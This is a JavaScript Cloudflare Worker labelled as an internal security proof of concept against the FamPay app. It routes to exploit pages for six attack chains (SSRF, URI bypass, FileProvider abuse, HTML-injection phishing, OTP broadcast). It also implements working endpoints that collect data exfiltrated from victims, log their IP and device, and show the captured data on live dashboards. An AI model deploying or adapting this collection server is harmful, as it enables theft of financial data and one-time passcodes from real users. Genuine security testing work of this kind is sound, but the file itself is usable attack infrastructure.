/**
 * FamPay Security PoC — Cloudflare Worker
 * Internal Security Team — Do Not Distribute
 *
 * Routes:
 *   /                    → index.html  (all chains overview)
 *   /trigger             → Chain A trigger
 *   /exploit             → Chain A exploit
 *   /report              → Chain A report
 *   /chain-b-trigger     → Chain B (DAI SSRF) trigger
 *   /chain-b-exploit     → Chain B exploit
 *   /chain-b-report      → Chain B report
 *   /chain-c-trigger     → Chain C (HierarchicalUri bypass) trigger
 *   /chain-c-exploit     → Chain C exploit
 *   /chain-c-report      → Chain C report
 *   /chain-d-report      → Chain D (CropImageActivity + FileProvider) report
 *   /chain-e-trigger     → Chain E (HTML injection phishing) trigger
 *   /chain-e-exploit     → Chain E exploit
 *   /chain-e-report      → Chain E report
 *   /chain-f-report      → Chain F (Razorpay OTP broadcast) report
 *   /log                 → receives callback data from exploit pages
 *   /log-viewer          → live dashboard of received callbacks (auto-refresh 4s)
 *   /log-clear           → clears in-memory log
 */

// In-memory store — resets on worker restart/cold start.
// For persistence add a Workers KV binding in wrangler.jsonc.
const logs = [];
let lastDump = null; // stores the latest full exploit report dump

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type',
};

function html(body, status = 200) {
  return new Response(body, {
    status,
    headers: { ...CORS, 'Content-Type': 'text/html;charset=UTF-8' },
  });
}

function json(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { ...CORS, 'Content-Type': 'application/json' },
  });
}

function escHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

export default {
  async fetch(request, env) {
    const url  = new URL(request.url);
    const path = url.pathname.replace(/\/+$/, '') || '/';

    // CORS preflight
    if (request.method === 'OPTIONS') {
      return new Response(null, { status: 204, headers: CORS });
    }

    // /log — receives exfiltrated data from exploit pages
    if (path === '/log') {
      const tag  = url.searchParams.get('tag')  || 'unknown';
      const data = url.searchParams.get('data') || '';
      const t    = url.searchParams.get('t')    || Date.now();
      const ip   = request.headers.get('cf-connecting-ip') || 'unknown';
      const ua   = request.headers.get('user-agent') || '';

      const entry = {
        timestamp: new Date(Number(t) || Date.now()).toISOString(),
        tag,
        data: decodeURIComponent(data),
        ip,
        device: ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Other',
        ua: ua.substring(0, 120),
      };

      logs.unshift(entry);
      if (logs.length > 500) logs.pop();

      console.log(`[POC] ${tag} | ${entry.ip} | ${entry.data.substring(0, 100)}`);

      return json({ ok: true, received: tag });
    }

    // /log-viewer — live dashboard
    if (path === '/log-viewer') {
      const rows = logs.length
        ? logs.map(l => `
            <tr>
              <td>${l.timestamp}</td>
              <td><span class="tag">${escHtml(l.tag)}</span></td>
              <td class="data">${escHtml(l.data)}</td>
              <td>${l.ip}</td>
              <td>${l.device}</td>
            </tr>`).join('')
        : '<tr><td colspan="5" class="empty">No callbacks yet — fire a chain first.</td></tr>';

      return html(`<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="4">
<title>Log Viewer — FamPay PoC</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#0a0a0f;color:#e0e0e0;font-family:monospace;padding:20px;font-size:12px}
  h2{color:#00e676;margin-bottom:4px;font-size:16px}
  .meta{color:#666;font-size:11px;margin-bottom:18px}
  .meta a{color:#448aff;margin-right:12px}
  .meta a.clear{color:#ff1744}
  table{width:100%;border-collapse:collapse}
  th{background:#13131a;color:#448aff;padding:8px 10px;text-align:left;border-bottom:1px solid #2a2a3a;font-size:11px}
  td{padding:8px 10px;border-bottom:1px solid #1a1a2a;vertical-align:top}
  td.data{word-break:break-all;max-width:340px;color:#00e676;font-size:11px}
  tr:hover td{background:#13131a}
  .tag{background:#1a1a2a;border:1px solid #2a2a3a;padding:2px 7px;border-radius:10px;color:#ffea00;font-size:10px}
  .empty{text-align:center;color:#555;padding:30px}
  .count{color:#ffea00;font-weight:bold}
</style></head>
<body>
<h2>&#128225; Callback Log Viewer</h2>
<div class="meta">
  Auto-refreshes every 4s &nbsp;·&nbsp; <span class="count">${logs.length}</span> entries
  &nbsp;·&nbsp; <a href="/">&#8592; All Chains</a>
  <a href="/log-clear" class="clear">&#128465; Clear logs</a>
</div>
<table>
  <thead>
    <tr><th>Timestamp</th><th>Tag</th><th>Data</th><th>IP</th><th>Device</th></tr>
  </thead>
  <tbody>${rows}</tbody>
</table>
</body></html>`);
    }

    // /dump — receives full exploit report via POST
    if (path === '/dump') {
      if (request.method === 'POST') {
        const body = await request.text();
        lastDump = {
          text: body,
          timestamp: new Date().toISOString(),
          ip: request.headers.get('cf-connecting-ip') || 'unknown',
        };
        return json({ ok: true });
      }
      return json({ error: 'POST only' }, 405);
    }

    // /dump-viewer — shows the last full dump
    if (path === '/dump-viewer') {
      const content = lastDump
        ? `<pre style="white-space:pre-wrap;word-break:break-all;color:#00e676;font-size:12px;line-height:1.6">${escHtml(lastDump.text)}</pre>`
        : '<p style="color:#555;text-align:center;padding:40px">No dump yet — run the exploit page first.</p>';
      return html(`<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Dump Viewer — FamPay PoC</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#0a0a0f;color:#e0e0e0;font-family:monospace;padding:20px;font-size:12px}
  h2{color:#00e676;margin-bottom:4px;font-size:16px}
  .meta{color:#666;font-size:11px;margin-bottom:16px}
  .meta a{color:#448aff;margin-right:12px}
  .copy-btn{background:#00e676;color:#000;border:none;padding:8px 16px;border-radius:6px;font-weight:700;font-size:12px;cursor:pointer;margin-bottom:16px}
  #content{background:#0d0d14;border:1px solid #2a2a3a;border-radius:6px;padding:16px}
</style></head>
<body>
<h2>&#128203; Full Exploit Dump</h2>
<div class="meta">
  ${lastDump ? `Captured: ${lastDump.timestamp} &nbsp;·&nbsp; From: ${lastDump.ip}` : 'No data yet'}
  &nbsp;·&nbsp; <a href="/log-viewer">&#128225; Log Viewer</a>
  <a href="/">&#8592; All Chains</a>
</div>
${lastDump ? `<button class="copy-btn" onclick="copyAll()">&#128203; Copy All to Clipboard</button>` : ''}
<div id="content">${content}</div>
<script>
function copyAll() {
  const text = document.getElementById('content').innerText;
  if (navigator.clipboard) {
    navigator.clipboard.writeText(text).then(() => {
      document.querySelector('.copy-btn').innerText = '✓ Copied!';
    });
  } else {
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
  }
}
<\/script>
</body></html>`);
    }

    // /log-clear
    if (path === '/log-clear') {
      logs.length = 0;
      return Response.redirect(new URL('/log-viewer', url).href, 302);
    }

    // Static pages served from public/ via ASSETS binding
    const staticRoutes = {
      '/':                 '/index.html',
      '/index.html':       '/index.html',
      '/trigger':          '/trigger.html',
      '/trigger.html':     '/trigger.html',
      '/exploit':          '/exploit.html',
      '/exploit.html':     '/exploit.html',
      '/report':           '/report.html',
      '/report.html':      '/report.html',
      // Chain B
      '/chain-b-trigger':  '/chain-b-trigger.html',
      '/chain-b-exploit':  '/chain-b-exploit.html',
      '/chain-b-report':   '/chain-b-report.html',
      // Chain C
      '/chain-c-trigger':  '/chain-c-trigger.html',
      '/chain-c-exploit':  '/chain-c-exploit.html',
      '/chain-c-report':   '/chain-c-report.html',
      // Chain D
      '/chain-d-report':   '/chain-d-report.html',
      // Chain E
      '/chain-e-trigger':  '/chain-e-trigger.html',
      '/chain-e-exploit':  '/chain-e-exploit.html',
      '/chain-e-report':   '/chain-e-report.html',
      // Chain F
      '/chain-f-report':   '/chain-f-report.html',
    };

    if (staticRoutes[path]) {
      const assetReq = new Request(new URL(staticRoutes[path], url).href, request);
      return env.ASSETS.fetch(assetReq);
    }

    return new Response('Not found', { status: 404, headers: CORS });
  },
};
